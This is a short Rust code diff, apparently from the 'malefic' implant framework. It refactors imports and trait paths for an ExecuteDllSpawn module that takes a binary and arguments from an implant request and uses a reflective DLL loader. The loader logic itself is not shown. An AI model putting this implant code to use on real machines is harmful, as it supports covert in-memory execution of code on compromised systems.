@@ -1,10 +1,7 @@
-use crate::{check_request, Module, Result, TaskResult};
-use async_trait::async_trait;
 use malefic_helper::common::utils::format_cmdline;
 use malefic_helper::win::kit::pe::reflective_loader::reflective_loader;
-use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_trait::module_impl;
+use crate::prelude::*;
 
 
 pub struct ExecuteDllSpawn {}
@@ -14,13 +11,13 @@ pub struct ExecuteDllSpawn {}
 impl Module for ExecuteDllSpawn {}
 
 #[async_trait]
-impl crate::ModuleImpl for ExecuteDllSpawn {
+impl malefic_proto::module::ModuleImpl for ExecuteDllSpawn {
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut crate::Input,
-        _sender: &mut crate::Output,
-    ) -> Result {
+        receiver: &mut malefic_proto::module::Input,
+        _sender: &mut malefic_proto::module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let bin = request.bin;
         let params = request.args;
